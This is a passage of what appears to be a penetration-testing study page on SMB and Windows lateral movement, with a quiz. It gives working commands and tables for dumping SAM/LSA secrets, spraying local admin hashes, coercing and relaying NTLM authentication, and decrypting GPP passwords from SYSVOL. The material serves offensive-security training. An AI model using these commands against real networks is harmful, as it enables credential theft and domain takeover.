+| RDP (3389) | **Conditional** | Requires Restricted Admin Mode → [RDP-3389](/01-Recon-and-Enumeration/Service-Enum/RDP-3389) |
+| MSSQL | **Yes** | Via Windows authentication |
+| LDAP | **Yes** | Via NTLM bind |
+| Kerberos | **No** | Uses the AES/RC4 key derived from the hash that is overpass-the-hash, not PtH |
+
+### The Local Admin Reuse Pattern
+
+```bash
+# Dump local SAM on one compromised host
+impacket-secretsdump -hashes :<HASH> Administrator@<IP>
+# Output: Administrator:500:aad3b435b51404eeaad3b435b51404ee:<HASH>:::
+
+# Spray that local Administrator hash across the subnet
+nxc smb <SUBNET>/24 -u Administrator -H <HASH> --local-auth
+```
+
+`--local-auth` authenticates against the local SAM (not the domain), required because the dumped hash is a local account. Hits indicate hosts sharing the same local Administrator password  extremely common with imaged workstation deployments.
+
+<Quiz
+  question="You get Pwn3d! on one workstation via local Administrator hash reuse. What is the highest-value immediate next step?"
+  options={[
+    "Brute force the Domain Administrator account over SMB",
+    "secretsdump the host, then spray the recovered local Administrator hash across the /24 with --local-auth",
+    "Immediately run ntlmrelayx against the domain controller",
+    "Run a full nmap vulnerability scan of the entire subnet"
+  ]}
+  answer={1}
+  explanation="Local admin password reuse is the most common Windows lateral-movement path. Dump the host's SAM/LSA with secretsdump, then spray the local Administrator NTLM hash across the subnet with nxc --local-auth  every matching host is instant local admin. Brute forcing DA over SMB (A) is loud and almost always locked out. ntlmrelayx (C) needs a signing-off target and a coercion/capture vector you have not set up yet. A vuln scan (D) is noise when you already have a credential that may unlock the whole subnet."
+/>
+
+## secretsdump Output Reference
+
+| Section | Contents | Use |
+|---------|----------|-----|
+| **Local SAM hashes** | Local user NTLM hashes | PtH against other hosts (local admin reuse), offline cracking |
+| **Cached domain creds (DCC2)** | Last 10 domain logons cached on the host | Crack offline with hashcat `-m 2100` slow but possible |
+| **LSA Secrets `$MACHINE.ACC`** | Machine account password | Forge silver tickets, machine-account Kerberos auth |
+| **LSA Secrets `_SC_<service>`** | Service account passwords stored by the SCM | Plaintext creds for accounts running Windows services |
+| **DPAPI_SYSTEM** | System DPAPI master key | Decrypt user DPAPI blobs (Credential Manager, browser passwords, Wi-Fi keys) |
+| **NTDS.dit (with `-just-dc`)** | Every domain user's NTLM hash | Full domain compromise DCSync output |
+
+The `_SC_*` entries are routinely overlooked but contain plaintext passwords for any service running as a domain account SQL service accounts, scheduled-task accounts, backup accounts often privileged domain users.
+
+## SMB Relay Attacks (Deep Dive)
+
+### Preconditions
+
+| Requirement | Detail |
+|-------------|--------|
+| Target signing | `signing:False` on the relay destination |
+| Network position | Same broadcast domain (LLMNR/NBNS), same VLAN (mitm6), or remote-coercible (PetitPotam/PrinterBug) |
+| Relay protocol | SMB → SMB, SMB → LDAP/LDAPS, SMB → MSSQL, SMB → HTTP/IIS/ADCS |
+| Source authentication | A user or computer account that can be coerced or captured |
+
+### Why Forced Authentication Works (Name Resolution)
+
+Responder and other poisoners abuse the fallback path Windows uses to resolve a host name. When a machine needs the IP for a name (for example a typo'd share `\\mysharefoder\` instead of `\\mysharedfolder\`), it works down this order:
+
+1. The local `hosts` file (`C:\Windows\System32\Drivers\etc\hosts`).
+2. The local DNS cache (recently resolved names).
+3. The configured DNS server.
+4. **If all of the above fail**, a multicast LLMNR / NBT-NS query to every machine on the local segment, asking "who is this name?"
+
+Step 4 is the weakness: the query is broadcast with no authentication of the answer. An attacker on the same segment simply answers "that's me," the victim trusts it, connects, and authenticates  handing over a NetNTLMv2 hash. Mistyped names, dead DNS records, stale mapped drives, and WPAD lookups all routinely trigger this fallback, which is why Responder catches hashes on most flat networks without any user interaction.
+
+### Triggers How to Get Authentication
+
+| Trigger | Mechanism | Reliability |
+|---------|-----------|-------------|
+| **LLMNR/NBT-NS poisoning** | Responder answers fallback name lookups | Opportunistic |
+| **mitm6** | Spoof IPv6 DNS via DHCPv6 | Reliable but loud affects entire VLAN |
+| **PetitPotam** (CVE-2021-36942) | Coerce machine account a MS-EFSRPC | Reliablepatched but often not |
+| **PrinterBug** (`printerbug.py`) | Coerce via MS-RPRN (Print Spooler) | Reliable where Spooler is enabled |
+| **DFSCoerce** | Coerce via MS-DFSNM | Reliable where DFS Namespace runs |
+| **ShadowCoerce** (CVE-2022-30154) | Coerce via MS-FSRVP | Reliable where VSS runs |
+| **`coercer.py`** | Multi-protocol coercion tries every known vector | Best first move when unsure |
+
+```bash
+# coercer auto-discovery runs every coercion technique against the target
+coercer.py coerce -u <USER> -p <PASS> -d <DOMAIN> -l <LHOST> -t <TARGET>
+```
+
+### Relay Targets and Outcomes
+
+| Relay To | Outcome |
+|----------|---------|
+| **SMB (signing:False)** | Admin → SAM dump, code execution. User → file share access as that user. |
+| **LDAPS on DC** | Modify domain objects. `--delegate-access` → RBCD. `--add-computer` → new computer account. `--escalate-user` → grant DCSync rights. |
+| **MSSQL** | Authenticate as relayed user; if `xp_cmdshell` rights → command execution. |
+| **HTTP/IIS** | Authenticate to web apps using Windows auth. |
+| **ADCS web enrollment (ESC8)** | Request a certificate as the relayed user a long-lived auth token usable for Kerberos PKINIT. Most powerful relay outcome where ADCS web enrollment is enabled. |
+
+### SOCKS Mode
+
+```bash
+sudo impacket-ntlmrelayx -tf relay-targets.txt -smb2support -socks
+# After a relay succeeds, reuse it through proxychains:
+proxychains nxc smb <RELAY_TARGET> -u <RELAYED_USER> -p ''
+proxychains impacket-secretsdump <RELAYED_USER>@<RELAY_TARGET>
+```
+
+Each relayed authentication is kept alive as a SOCKS proxy entry on port 1080, so you can reuse the session for multiple operations without re-triggering the victim's authentication.
+
+## GPP cpassword (SYSVOL Treasure)
+
+Group Policy Preferences let admins set local accounts and scheduled-task credentials via GPO. The cpassword field was AES-encrypted with a key Microsoft published in MSDN meaning every cpassword in SYSVOL is trivially decryptable.
+
+```bash
+# Via NetExec module
+nxc smb <DC> -u <USER> -p <PASS> -M gpp_password
+
+# Manual: search SYSVOL for cpassword fields
+smbclient //<DC>/SYSVOL -U '<DOMAIN>\<USER>%<PASS>' -c 'recurse;ls' \
+    | grep -i 'groups.xml\|services.xml\|scheduledtasks.xml'
+
+# Decrypt a found cpassword
+gpp-decrypt '<CPASSWORD_BLOB>'
+```
+
+MS14-025 (May 2014) removed the ability to *set* new GPP passwords, but **existing GPPs were not removed from SYSVOL**  the data persists on any domain managed before the patch. On older environments this routinely yields working local Administrator credentials for every workstation in the domain.
+
+## Nmap NSE Scripts
+
+```bash
+nmap -sV -sC -p139,445 <IP>                                # default scripts
+nmap --script "smb-vuln-*" -p445 <IP>                       # all vuln scripts
+nmap --script "smb-enum-*" -p445 <IP>                       # all enum scripts
+nmap --script "smb-os-discovery,smb-security-mode,smb-protocols" -p445 <IP>
+```
+
+| Script | Purpose |
+|--------|---------|
+| `smb-os-discovery` | OS, hostname, NetBIOS, domain, FQDN |
+| `smb-security-mode` | Signing requirement |
+| `smb-protocols` | Supported SMB dialects |
+| `smb-enum-shares` | List shares (requires null/guest or auth) |
+| `smb-enum-users` | List users via SAMR |
+| `smb-vuln-ms17-010` | EternalBlue check |
+| `smb-vuln-cve-2017-7494` | Samba RCE (SambaCry) |
+
+
+## Samba Configuration Reference
+
+`/etc/samba/smb.conf` is the Samba server config. Most CTF/lab misconfigurations live in the share definitions.
+
+| Setting | Risk |
+|---------|------|
+| `guest ok = yes` / `public = yes` | Anonymous access allowed |
+| `read only = no` / `writable = yes` | Write access web shell, `.ssh/authorized_keys`, cron script replacement |
+| `enable privileges = yes` | Permits SeDiskOperator and friends local privesc |
+| `create mask = 0777` / `directory mask = 0777` | Files/dirs created world-writable |
+| `map to guest = bad user` | Invalid creds silently fall through to guest |
+| `restrict anonymous = 0` | Allow null sessions on `IPC$` enables RID cycling and SAM enumeration |
+| `server signing = disabled` | NTLM relay possible against this server |
+| `min protocol = NT1` | SMBv1 enabled legacy vulnerability surface |
+| `force user = root` | Connections execute as the forced user regardless of login |
+
+
+<div className="flex flex-wrap gap-2 mb-4">
+  #SMB #Samba #Windows #FileSharing #Enumeration #PrivilegeEscalation #NTLM #NullSession #PenTest #RedTeam
+</div>
